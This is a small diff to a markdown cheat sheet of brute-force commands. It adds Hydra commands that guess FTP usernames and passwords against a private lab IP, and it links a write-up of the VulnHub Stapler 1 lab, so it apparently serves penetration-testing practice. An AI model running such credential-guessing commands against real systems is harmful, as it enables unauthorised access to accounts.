@@ -3,7 +3,13 @@ Bruteforce commands
 Hydra
 
 #1 FTP 
+```
 hydra -L usernames.txt -P usernames.txt 192.168.1.6 ftp
+
+hydra -L users.txt -e nsr 192.168.1.6 ftp (nsr -> Using users.txt, bruteforcing the password in the reverse order)
+```
+
+https://medium.com/@bondo.mike/vulnhub-stapler-1-ab928900d614
 
 John
 
